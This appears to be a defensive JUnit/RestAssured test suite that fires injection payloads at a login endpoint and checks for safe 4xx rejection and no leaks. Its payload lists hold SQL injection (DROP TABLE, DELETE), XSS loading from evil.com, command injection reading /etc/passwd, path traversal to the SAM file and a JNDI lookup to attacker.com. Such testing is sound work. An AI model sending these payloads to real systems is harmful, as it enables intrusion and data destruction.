package com.practice;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import io.restassured.specification.RequestSpecification;
import org.junit.jupiter.api.*;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.platform.engine.discovery.DiscoverySelectors;
import org.junit.platform.launcher.Launcher;
import org.junit.platform.launcher.LauncherDiscoveryRequest;
import org.junit.platform.launcher.core.LauncherDiscoveryRequestBuilder;
import org.junit.platform.launcher.core.LauncherFactory;
import org.junit.platform.launcher.listeners.SummaryGeneratingListener;
import org.junit.platform.launcher.listeners.TestExecutionSummary;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.stream.Stream;

import static io.restassured.RestAssured.given;
import static org.junit.jupiter.api.Assertions.*;

/**
 * Automated Security & Defensive Input-Validation Test Suite for REST API Endpoint:
 * POST /test-login
 *
 * Parameters under test:
 * - @RequestParam("bioId") Long bioId
 * - @RequestParam("password") String password
 *
 * Assertions verified on every test:
 * 1. Safe 4xx status code returned (400 Bad Request, 401 Unauthorized, 403 Forbidden, 422 Unprocessable Entity).
 * 2. Never 200 OK (no authentication bypass or acceptance of malicious input).
 * 3. Never 5xx (no unhandled server exceptions, crashes, or unhandled 500 errors).
 * 4. Response body contains no SQL syntax errors, database artifacts, or ORM leaks.
 * 5. Response body contains no stack traces, Java/Spring internals, or debug information.
 * 6. Response body contains no OS command output (e.g., uid=, root:, directory listings).
 * 7. Results logged with timestamp, payload, status code, response time, and pass/fail to a .log file.
 */
@DisplayName("Defensive Security Input Validation Suite - POST /test-login")
public class FirstTest {

    // Configurable endpoint target (Override via -Dapi.base.url=http://localhost:8080)
    public static final String DEFAULT_BASE_URL = System.getProperty("api.base.url", "http://localhost:8080");
    public static final String ENDPOINT = "/auth/test-login";
    public static final String LOG_FILE_PATH = "security_test_results.log";

    // Valid baseline test fixtures
    public static final Long VALID_BIO_ID = 1001L;
    public static final String VALID_PASSWORD = "ValidSecurePassword123!";

    // Sentinel to denote a parameter that should be intentionally omitted from the request
    public static final Object OMITTED_PARAM = new Object();

    // Security leak detection patterns
    private static final List<String> SQL_ERROR_PATTERNS = List.of(
            "sql syntax", "sqlexception", "syntax error at or near",
            "unclosed quotation mark", "hibernate", "jdbc",
            "ora-", "mysql", "postgresql", "sqlite3",
            "preparedstatement", "table \"users\"", "column not found",
            "check the manual that corresponds to your mysql", "pg_catalog"
    );

    private static final List<String> STACK_TRACE_PATTERNS = List.of(
            "exception in thread", "at org.springframework.",
            "at java.base/", "at java.lang.", "at com.",
            "nullpointerexception", "illegalargumentexception",
            "numberformatexception", "methodargumenttypemismatchexception",
            "constraintviolationexception", "whitelabel error page",
            "internal server error", "org.apache.catalina", "org.apache.tomcat"
    );

    private static final List<String> COMMAND_OUTPUT_PATTERNS = List.of(
            "uid=", "gid=", "root:", "daemon:", "/bin/sh", "/bin/bash",
            "nt authority\\system", "volume serial number",
            "[boot loader]", "windows ip configuration", "directory of c:\\",
            "bytes free"
    );

    private static final List<String> AUTH_BYPASS_PATTERNS = List.of(
            "\"authenticated\":true", "\"authenticated\": true",
            "\"authenticated\":\"true\"", "\"status\":\"success\"",
            "\"status\": \"success\"", "\"loginsuccess\":true",
            "\"token\":", "\"jwt\":", "\"accesstoken\":",
            "\"bearer \""
    );

    private static final DateTimeFormatter TIMESTAMP_FORMATTER =
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss.SSS");

    @BeforeAll
    public static void setup() {
        RestAssured.baseURI = DEFAULT_BASE_URL;
        initializeLogFile();
    }

    /**
     * Initializes the .log file with a run header.
     */
    private static synchronized void initializeLogFile() {
        try (PrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(LOG_FILE_PATH, true)))) {
            writer.println();
            writer.println("========================================================================================");
            writer.println("SECURITY & DEFENSIVE INPUT VALIDATION TEST REPORT");
            writer.println("Target: " + DEFAULT_BASE_URL + ENDPOINT + " (Method: POST)");
            writer.println("Parameters Audited: @RequestParam(\"bioId\") Long, @RequestParam(\"password\") String");
            writer.println("Session Started: " + LocalDateTime.now().format(TIMESTAMP_FORMATTER));
            writer.println("========================================================================================");
            writer.flush();
        } catch (IOException e) {
            System.err.println("Warning: Unable to initialize log file " + LOG_FILE_PATH + ": " + e.getMessage());
        }
    }

    /**
     * Core test dispatcher and security validator.
     * Sends the POST request with the specified parameters, logs the outcome,
     * and asserts safe 4xx response with no sensitive data leaks.
     */
    protected static Response executeAndValidate(Object bioId, Object password,
                                                 String category, String payloadDescription) {
        return executeAndValidateWithExtras(bioId, password, Collections.emptyMap(), category, payloadDescription);
    }

    protected static Response executeAndValidateWithExtras(Object bioId, Object password,
                                                           Map<String, Object> extraParams,
                                                           String category, String payloadDescription) {
        long startTime = System.currentTimeMillis();
        Response response = null;
        List<String> violations = new ArrayList<>();
        int statusCode = 0;
        long responseTime = 0;
        String responseBody = "";
        Map<String, String> requestParamsSent = new LinkedHashMap<>();

        try {
            RequestSpecification request = given()
                    .contentType("application/x-www-form-urlencoded; charset=UTF-8");

            // Attach bioId if not omitted
            if (bioId != OMITTED_PARAM) {
                if (bioId != null) {
                    request.formParam("bioId", bioId);
                    requestParamsSent.put("bioId", String.valueOf(bioId));
                } else {
                    request.formParam("bioId", "");
                    requestParamsSent.put("bioId", "null (sent as empty string \"\")");
                }
            } else {
                requestParamsSent.put("bioId", "[OMITTED / NOT SENT]");
            }

            // Attach password if not omitted
            if (password != OMITTED_PARAM) {
                if (password != null) {
                    request.formParam("password", password);
                    requestParamsSent.put("password", String.valueOf(password));
                } else {
                    request.formParam("password", "");
                    requestParamsSent.put("password", "null (sent as empty string \"\")");
                }
            } else {
                requestParamsSent.put("password", "[OMITTED / NOT SENT]");
            }

            // Attach any extra parameters (for parameter tampering tests)
            if (extraParams != null && !extraParams.isEmpty()) {
                extraParams.forEach((k, v) -> {
                    request.formParam(k, v);
                    requestParamsSent.put(k, String.valueOf(v));
                });
            }

            response = request.post(ENDPOINT);
            responseTime = System.currentTimeMillis() - startTime;
            statusCode = response.getStatusCode();
            responseBody = response.getBody() != null ? response.getBody().asString() : "";

            // 1. Status Code Assertions
            if (statusCode == 200) {
                violations.add("AUTH BYPASS / FALSE ACCEPTANCE: Endpoint returned 200 OK for malicious/invalid input.");
            } else if (statusCode >= 500 && statusCode <= 599) {
                violations.add("UNHANDLED SERVER ERROR: Endpoint returned " + statusCode +
                        " (expected safe 4xx client rejection, server crashed or threw unhandled exception).");
            } else if (statusCode < 400 || statusCode >= 500) {
                violations.add("UNEXPECTED STATUS: Expected 4xx client error, but received HTTP " + statusCode + ".");
            }

            // 2. Sensitive Data & Leakage Checks
            String lowerBody = responseBody.toLowerCase();

            for (String pattern : SQL_ERROR_PATTERNS) {
                if (lowerBody.contains(pattern.toLowerCase())) {
                    violations.add("SQL LEAK: Response body exposes database error signature: '" + pattern + "'");
                }
            }

            for (String pattern : STACK_TRACE_PATTERNS) {
                if (lowerBody.contains(pattern.toLowerCase())) {
                    violations.add("STACK TRACE LEAK: Response body exposes internal exception/stack trace: '" + pattern + "'");
                }
            }

            for (String pattern : COMMAND_OUTPUT_PATTERNS) {
                if (lowerBody.contains(pattern.toLowerCase())) {
                    violations.add("COMMAND OUTPUT LEAK: Response body exposes OS command output artifact: '" + pattern + "'");
                }
            }

            for (String pattern : AUTH_BYPASS_PATTERNS) {
                if (lowerBody.contains(pattern.toLowerCase())) {
                    violations.add("AUTH TOKEN LEAK: Response body contains authentication success/token payload: '" + pattern + "'");
                }
            }

        } catch (Exception e) {
            responseTime = System.currentTimeMillis() - startTime;
            if (isConnectionFailure(e)) {
                violations.add("CONNECTION REFUSED: Target endpoint " + DEFAULT_BASE_URL + ENDPOINT +
                        " is not reachable. Ensure the Spring Boot API is running (or pass -Dapi.base.url=http://host:port).");
            } else {
                violations.add("REQUEST EXECUTION FAILURE: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            }
        }

        boolean passed = violations.isEmpty();
        String requestTransport = "POST " + DEFAULT_BASE_URL + ENDPOINT + " (application/x-www-form-urlencoded)";
        logResult(passed, statusCode, responseTime, category, payloadDescription,
                requestTransport, requestParamsSent, violations, responseBody);

        assertTrue(passed,
                String.format("Security Test Failed! Category: [%s] | Payload: [%s]%nRequest Params: %s%nViolations:%n - %s%nResponse Status: %d%nResponse Body: %s",
                        category, payloadDescription, requestParamsSent,
                        String.join(System.lineSeparator() + " - ", violations),
                        statusCode, truncate(responseBody, 250)));

        return response;
    }

    private static boolean isConnectionFailure(Throwable t) {
        while (t != null) {
            if (t instanceof java.net.ConnectException ||
                    (t.getMessage() != null && (t.getMessage().contains("Connection refused") ||
                            t.getMessage().contains("connect timed out")))) {
                return true;
            }
            t = t.getCause();
        }
        return false;
    }

    private static synchronized void logResult(boolean passed, int statusCode, long responseTime,
                                               String category, String payloadDescription,
                                               String requestTransport, Map<String, String> requestParamsSent,
                                               List<String> violations, String responseBody) {
        String timestamp = LocalDateTime.now().format(TIMESTAMP_FORMATTER);
        String resultStr = passed ? "PASS" : "FAIL";
        String statusStr = statusCode > 0 ? "HTTP " + statusCode : "ERR/NONE";

        String details;
        if (passed) {
            details = "Safely rejected (4xx). No stack traces, SQL errors, or command leaks.";
        } else {
            details = "VIOLATION: " + String.join("; ", violations);
        }

        // 1. Console Output
        System.out.printf("[%s] %-10s (%3dms) | %-18s | Test: %s%n",
                resultStr, statusStr, responseTime, category, truncate(payloadDescription, 45));
        System.out.print("   --> Request Params: ");
        if (requestParamsSent == null || requestParamsSent.isEmpty()) {
            System.out.println("{none}");
        } else {
            System.out.println(formatParamsForConsole(requestParamsSent));
        }
        System.out.println("   <-- Response Body:  " + formatResponseBody(responseBody, 250));
        if (!passed) {
            System.out.println("   !!! VIOLATIONS:     " + details);
        }

        // 2. Structured File Logging
        try (PrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(LOG_FILE_PATH, true)))) {
            writer.println("----------------------------------------------------------------------------------------");
            writer.printf("[%s] [%s] Category: %s | Test: %s%n", timestamp, resultStr, category, payloadDescription);
            writer.println("  [REQUEST]");
            writer.println("    Endpoint & Transport: " + requestTransport);
            writer.println("    Request Params Sent:");
            if (requestParamsSent != null && !requestParamsSent.isEmpty()) {
                requestParamsSent.forEach((k, v) ->
                        writer.printf("      * %-14s = %s%n", k, formatParamValue(v)));
            } else {
                writer.println("      * (None)");
            }
            writer.println("  [RESPONSE]");
            writer.printf("    Status Code:          %s (%d ms)%n", statusStr, responseTime);
            writer.println("    Response Body:        " + formatResponseBody(responseBody, 2000));
            writer.println("  [VERDICT]");
            writer.println("    Outcome:              " + (passed ? "PASS" : "FAIL - " + details));
            if (!violations.isEmpty()) {
                writer.println("    Violations Detected:");
                for (String v : violations) {
                    writer.println("      - " + v);
                }
            }
            writer.flush();
        } catch (IOException e) {
            System.err.println("Failed to write to log file: " + e.getMessage());
        }
    }

    private static String formatParamsForConsole(Map<String, String> params) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, String> entry : params.entrySet()) {
            if (!first) sb.append(", ");
            sb.append(entry.getKey()).append("=").append(truncate(entry.getValue(), 60));
            first = false;
        }
        sb.append("}");
        return sb.toString();
    }

    private static String formatParamValue(String val) {
        if (val == null) return "null";
        if (val.length() > 200) {
            return val.substring(0, 150) + "... [truncated: " + val.length() + " chars total]";
        }
        return val;
    }

    private static String formatResponseBody(String body, int maxLen) {
        if (body == null || body.isBlank()) {
            return "(empty body)";
        }
        String clean = body.replace("\r", " ").replace("\n", " ");
        if (clean.length() <= maxLen) {
            return clean;
        }
        return clean.substring(0, maxLen) + "... [truncated: " + clean.length() + " chars total]";
    }

    private static String truncate(String text, int maxLength) {
        if (text == null) return "null";
        String clean = text.replace("\r", " ").replace("\n", " ");
        if (clean.length() <= maxLength) return clean;
        return clean.substring(0, maxLength) + "... (truncated)";
    }

    // =========================================================================
    // 1. SQL INJECTION SECURITY TEST CASES
    // =========================================================================
    @Nested
    @DisplayName("1. SQL Injection Tests")
    class SqlInjectionTests {

        @ParameterizedTest(name = "SQLi in password: {0}")
        @ValueSource(strings = {
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "'; DROP TABLE users;--",
                "'; DELETE FROM accounts;--",
                "' UNION SELECT null, null, null--",
                "1' ORDER BY 1--+",
                "admin' /*",
                "' OR 'x'='x",
                "\") OR (\"1\"=\"1",
                "' OR '' = '",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "'; pg_sleep(5)--",
                "1' OR '1' = '1' /*",
                "' OR 1=1#",
                "admin' or '1'='1'#"
        })
        @DisplayName("Verify SQL injection payloads in password are safely rejected")
        void testSqlInjectionInPassword(String sqliPayload) {
            executeAndValidate(VALID_BIO_ID, sqliPayload, "SQL Injection", sqliPayload);
        }

        @ParameterizedTest(name = "SQLi in bioId: {0}")
        @ValueSource(strings = {
                "1 OR 1=1",
                "' OR '1'='1",
                "1; DROP TABLE users;--",
                "1 UNION SELECT null, null--",
                "1001' OR '1'='1"
        })
        @DisplayName("Verify SQL injection payloads in bioId parameter are rejected with 4xx")
        void testSqlInjectionInBioId(String sqliPayload) {
            executeAndValidate(sqliPayload, VALID_PASSWORD, "SQL Injection", "bioId=" + sqliPayload);
        }
    }

    // =========================================================================
    // 2. CROSS-SITE SCRIPTING (XSS) TEST CASES
    // =========================================================================
    @Nested
    @DisplayName("2. XSS Security Tests")
    class XssInjectionTests {

        @ParameterizedTest(name = "XSS in password: {0}")
        @ValueSource(strings = {
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "<body onload=alert('XSS')>",
                "\"><script src=http://evil.com/x.js></script>",
                "<iframe src=\"javascript:alert(1)\"></iframe>",
                "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
                "\"><svg/onload=confirm(1)>",
                "';alert(String.fromCharCode(88,83,83))//\\",
                "<a href=\"javascript:alert(1)\">Click</a>"
        })
        @DisplayName("Verify XSS strings in password do not execute and are rejected safely")
        void testXssInPassword(String xssPayload) {
            executeAndValidate(VALID_BIO_ID, xssPayload, "XSS Injection", xssPayload);
        }

        @ParameterizedTest(name = "XSS in bioId: {0}")
        @ValueSource(strings = {
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>"
        })
        @DisplayName("Verify XSS strings in bioId are rejected with 4xx type mismatch")
        void testXssInBioId(String xssPayload) {
            executeAndValidate(xssPayload, VALID_PASSWORD, "XSS Injection", "bioId=" + xssPayload);
        }
    }

    // =========================================================================
    // 3. OS COMMAND INJECTION TEST CASES
    // =========================================================================
    @Nested
    @DisplayName("3. OS Command Injection Tests")
    class CommandInjectionTests {

        @ParameterizedTest(name = "Command injection in password: {0}")
        @ValueSource(strings = {
                "; whoami",
                "$(whoami)",
                "& whoami",
                "| whoami",
                "&& whoami",
                "|| whoami",
                "; id",
                "| id",
                "; cat /etc/passwd",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "`whoami`",
                "& dir",
                "; dir",
                "| dir",
                "$(sleep 5)",
                "| echo vulnerable",
                "; uname -a",
                "& calc.exe",
                "| net user"
        })
        @DisplayName("Verify OS command strings are treated as plain text and rejected safely")
        void testCommandInjectionInPassword(String cmdPayload) {
            executeAndValidate(VALID_BIO_ID, cmdPayload, "Command Injection", cmdPayload);
        }

        @ParameterizedTest(name = "Command injection in bioId: {0}")
        @ValueSource(strings = {
                "; whoami",
                "$(whoami)",
                "& dir",
                "| id"
        })
        @DisplayName("Verify OS command strings in bioId parameter are rejected with 4xx")
        void testCommandInjectionInBioId(String cmdPayload) {
            executeAndValidate(cmdPayload, VALID_PASSWORD, "Command Injection", "bioId=" + cmdPayload);
        }
    }

    // =========================================================================
    // 4. BOUNDARY, NULL, UNICODE, AND MALFORMED INPUT TEST CASES
    // =========================================================================
    @Nested
    @DisplayName("4. Boundary, Null, Unicode & Malformed Input Tests")
    class BoundaryAndMalformedInputTests {

        @Test
        @DisplayName("Verify empty password string is rejected")
        void testEmptyPassword() {
            executeAndValidate(VALID_BIO_ID, "", "Boundary/Empty", "Empty password string \"\"");
        }

        @ParameterizedTest(name = "Whitespace password: [{0}]")
        @ValueSource(strings = {
                " ",
                "    ",
                "\t",
                "\n",
                "\r\n",
                " \t \n "
        })
        @DisplayName("Verify whitespace-only passwords are rejected")
        void testWhitespacePassword(String whitespace) {
            executeAndValidate(VALID_BIO_ID, whitespace, "Boundary/Whitespace", "Whitespace-only password");
        }

        @Test
        @DisplayName("Verify extremely long password (1,000 characters) - DOS / Buffer limit")
        void testLongPassword1000Chars() {
            String longPassword = "A".repeat(1000);
            executeAndValidate(VALID_BIO_ID, longPassword, "Boundary/LongString", "1,000 char string");
        }

        @Test
        @DisplayName("Verify extremely long password (10,000 characters) - Buffer limit")
        void testLongPassword10000Chars() {
            String longPassword = "SuperLongSecretPassword!".repeat(400); // 9,600 chars
            executeAndValidate(VALID_BIO_ID, longPassword, "Boundary/LongString", "9,600 char string");
        }

        @Test
        @DisplayName("Verify oversized password (65,536 characters / 64KB) - Buffer limit")
        void testOversizedPassword64KB() {
            String oversizedPassword = "Z".repeat(65536);
            executeAndValidate(VALID_BIO_ID, oversizedPassword, "Boundary/LongString", "65,536 char string (64KB)");
        }

        @ParameterizedTest(name = "Unicode / Special charset: {0}")
        @ValueSource(strings = {
                "🔥🔒🚀👻🛡️",
                "こんにちは世界",
                "مرحبا بالعالم",
                "Здравствуйте",
                "admin\u0000password",                   // Null byte injection
                "\u202Ereversed_password",              // Right-to-Left Override (RLO)
                "test\uFEFFpassword",                   // Zero-width non-breaking space
                "§±!@#$%^&*()_+-=[]{}|;':\",./<>?`~"    // Special punctuation set
        })
        @DisplayName("Verify Unicode, emojis, RTL characters, and null bytes are handled safely")
        void testUnicodeAndSpecialCharsets(String specialPayload) {
            executeAndValidate(VALID_BIO_ID, specialPayload, "Unicode/Encoding", specialPayload);
        }

        @ParameterizedTest(name = "Malformed JSON / Object injection: {0}")
        @ValueSource(strings = {
                "{\"bioId\": 1001, \"password\": \"secret\"}",
                "{\"admin\": true}",
                "{\"$gt\": \"\"}",                      // NoSQL injection payload
                "{\"$ne\": null}",
                "[1, 2, 3]",
                "{\"bioId\": [1, 2], \"role\": \"ADMIN\"}",
                "true",
                "null"
        })
        @DisplayName("Verify malformed JSON-like strings passed as password are rejected")
        void testMalformedJsonStrings(String jsonPayload) {
            executeAndValidate(VALID_BIO_ID, jsonPayload, "Malformed/JSON", jsonPayload);
        }

        @ParameterizedTest(name = "Format string & Path traversal: {0}")
        @ValueSource(strings = {
                "%s%s%s%s%s%n%x%d",                     // C-style format string injection
                "%00",                                   // URL-encoded null byte
                "../../../../../../etc/passwd",          // Path traversal
                "..\\..\\..\\..\\windows\\system32\\config\\SAM",
                "${jndi:ldap://attacker.com/malicious}", // Log4j / JNDI injection
                "${7*7}",                                // Server-Side Template Injection (SSTI)
                "#{7*7}"
        })
        @DisplayName("Verify format strings, path traversals, and JNDI/SSTI payloads are safely rejected")
        void testFormatStringAndTraversalPayloads(String payload) {
            executeAndValidate(VALID_BIO_ID, payload, "Format/Traversal", payload);
        }
    }

    // =========================================================================
    // 5. MISSING AND INVALID PARAMETER TYPE TEST CASES
    // =========================================================================
    @Nested
    @DisplayName("5. Parameter Type & Missing Parameter Tests")
    class ParameterTypeAndMissingParameterTests {

        @ParameterizedTest(name = "Invalid bioId string: {0}")
        @ValueSource(strings = {
                "invalidBioId",
                "abc123",
                "true",
                "1234.5678",                             // Floating point value
                "NaN",
                "Infinity",
                "!@#$%^&*()",
                "1001 2002",
                "0x7B",                                  // Hexadecimal notation
                "99999999999999999999999999999999999999999999999999999999999" // Out of Long range
        })
        @DisplayName("Verify alphanumeric and out-of-range bioId strings return 4xx (400 Bad Request)")
        void testInvalidBioIdTypes(String invalidBioId) {
            executeAndValidate(invalidBioId, VALID_PASSWORD, "Invalid Type/bioId", "bioId=" + invalidBioId);
        }

        @ParameterizedTest(name = "Negative / Boundary bioId: {0}")
        @ValueSource(strings = {
                "-1",
                "-999999",
                "0",
                ""
        })
        @DisplayName("Verify negative, zero, and empty bioId values return safe 4xx")
        void testNegativeAndEmptyBioId(String boundaryBioId) {
            executeAndValidate(boundaryBioId, VALID_PASSWORD, "Boundary/bioId", "bioId=" + boundaryBioId);
        }

        @Test
        @DisplayName("Verify missing bioId parameter entirely returns 400 Bad Request")
        void testMissingBioIdParameter() {
            executeAndValidate(OMITTED_PARAM, VALID_PASSWORD, "Missing Param", "bioId omitted from request");
        }

        @Test
        @DisplayName("Verify missing password parameter entirely returns 400 Bad Request")
        void testMissingPasswordParameter() {
            executeAndValidate(VALID_BIO_ID, OMITTED_PARAM, "Missing Param", "password omitted from request");
        }

        @Test
        @DisplayName("Verify missing both bioId and password parameters returns 400 Bad Request")
        void testMissingBothParameters() {
            executeAndValidate(OMITTED_PARAM, OMITTED_PARAM, "Missing Param", "Both bioId & password omitted");
        }

        @Test
        @DisplayName("Verify parameter tampering with unexpected extra admin fields is rejected/ignored")
        void testParameterTamperingExtraFields() {
            Map<String, Object> extraParams = new HashMap<>();
            extraParams.put("isAdmin", "true");
            extraParams.put("role", "SUPERADMIN");
            extraParams.put("auth_override", "1");

            // Even if valid credentials are provided alongside unauthorized privileges,
            // or if invalid credentials with privilege escalation flags are sent,
            // verify no auth bypass or 500 internal server error occurs.
            executeAndValidateWithExtras(VALID_BIO_ID, "InvalidAttempt123!", extraParams,
                    "Tampering", "Extra admin parameters injected");
        }
    }

    // =========================================================================
    // 6. TRANSPORT, HEADER & CONTENT-TYPE ANOMALY TESTS
    // =========================================================================
    @Nested
    @DisplayName("6. Transport & Content-Type Anomaly Tests")
    class TransportAndPayloadSecurityTests {

        @Test
        @DisplayName("Verify SQL injection via query parameters (POST with queryParams)")
        void testSqlInjectionViaQueryParams() {
            long startTime = System.currentTimeMillis();
            Response response = null;
            List<String> violations = new ArrayList<>();
            int statusCode = 0;
            String responseBody = "";

            try {
                response = given()
                        .queryParam("bioId", VALID_BIO_ID)
                        .queryParam("password", "' OR '1'='1")
                        .post(ENDPOINT);

                statusCode = response.getStatusCode();
                responseBody = response.getBody() != null ? response.getBody().asString() : "";

                if (statusCode == 200) {
                    violations.add("AUTH BYPASS: Endpoint returned 200 OK for queryParam SQLi.");
                } else if (statusCode >= 500) {
                    violations.add("UNHANDLED SERVER ERROR: Endpoint returned " + statusCode);
                } else if (statusCode < 400) {
                    violations.add("Unexpected non-4xx status: " + statusCode);
                }
            } catch (Exception e) {
                if (isConnectionFailure(e)) {
                    violations.add("CONNECTION REFUSED: Target " + DEFAULT_BASE_URL + " not reachable.");
                } else {
                    violations.add("ERROR: " + e.getMessage());
                }
            }

            long elapsed = System.currentTimeMillis() - startTime;
            boolean passed = violations.isEmpty();
            Map<String, String> queryParams = new LinkedHashMap<>();
            queryParams.put("bioId", String.valueOf(VALID_BIO_ID));
            queryParams.put("password", "' OR '1'='1'");
            String requestTransport = "POST " + DEFAULT_BASE_URL + ENDPOINT + " (Query Parameters in URL)";
            logResult(passed, statusCode, elapsed, "Transport/QueryParam", "SQLi in queryParam",
                    requestTransport, queryParams, violations, responseBody);
            assertTrue(passed, "Transport QueryParam test failed: " + String.join("; ", violations));
        }

        @Test
        @DisplayName("Verify JSON body with application/json is rejected safely (415 or 400, never 500)")
        void testJsonPayloadRejection() {
            long startTime = System.currentTimeMillis();
            Response response = null;
            List<String> violations = new ArrayList<>();
            int statusCode = 0;
            String responseBody = "";

            try {
                response = given()
                        .contentType("application/json")
                        .body("{\"bioId\": 1001, \"password\": \"' OR '1'='1\"}")
                        .post(ENDPOINT);

                statusCode = response.getStatusCode();
                responseBody = response.getBody() != null ? response.getBody().asString() : "";

                if (statusCode == 200) {
                    violations.add("AUTH BYPASS: Accepted unexpected JSON payload with 200 OK.");
                } else if (statusCode >= 500) {
                    violations.add("UNHANDLED SERVER ERROR: 5xx on application/json payload: " + statusCode);
                } else if (statusCode < 400) {
                    violations.add("Expected 4xx (415 Unsupported Media Type or 400), got: " + statusCode);
                }
            } catch (Exception e) {
                if (isConnectionFailure(e)) {
                    violations.add("CONNECTION REFUSED: Target " + DEFAULT_BASE_URL + " not reachable.");
                } else {
                    violations.add("ERROR: " + e.getMessage());
                }
            }

            long elapsed = System.currentTimeMillis() - startTime;
            boolean passed = violations.isEmpty();
            Map<String, String> bodyInfo = new LinkedHashMap<>();
            bodyInfo.put("Content-Type", "application/json");
            bodyInfo.put("JSON Body Payload", "{\"bioId\": 1001, \"password\": \"' OR '1'='1\"}");
            String requestTransport = "POST " + DEFAULT_BASE_URL + ENDPOINT + " (application/json Body)";
            logResult(passed, statusCode, elapsed, "Content-Type", "Raw JSON payload",
                    requestTransport, bodyInfo, violations, responseBody);
            assertTrue(passed, "Content-Type negotiation test failed: " + String.join("; ", violations));
        }
    }

    // =========================================================================
    // PROGRAMMATIC LAUNCHER (Allows running via 'mvn exec:java' or 'java FirstTest')
    // =========================================================================
    public static void main(String[] args) {
        System.out.println("Starting Automated Security Test Suite for /test-login...");
        System.out.println("Target Base URL: " + DEFAULT_BASE_URL);

        LauncherDiscoveryRequest request = LauncherDiscoveryRequestBuilder.request()
                .selectors(DiscoverySelectors.selectClass(FirstTest.class))
                .build();

        Launcher launcher = LauncherFactory.create();
        SummaryGeneratingListener listener = new SummaryGeneratingListener();
        launcher.registerTestExecutionListeners(listener);
        launcher.execute(request);

        TestExecutionSummary summary = listener.getSummary();
        System.out.println();
        System.out.println("========================================================================================");
        System.out.println("SECURITY TEST SUITE EXECUTION SUMMARY");
        System.out.println("========================================================================================");
        System.out.println("Total Tests Found:      " + summary.getTestsFoundCount());
        System.out.println("Total Tests Started:    " + summary.getTestsStartedCount());
        System.out.println("Tests Succeeded:        " + summary.getTestsSucceededCount());
        System.out.println("Tests Failed:           " + summary.getTestsFailedCount());
        System.out.println("Tests Skipped:          " + summary.getTestsSkippedCount());
        System.out.println("Results Log Written To: " + LOG_FILE_PATH);
        System.out.println("========================================================================================");

        if (summary.getTestsFailedCount() > 0) {
            System.err.println("Security vulnerabilities or test failures were identified! Check " + LOG_FILE_PATH);
            System.exit(1);
        } else {
            System.out.println("All security checks passed safely!");
            System.exit(0);
        }
    }
}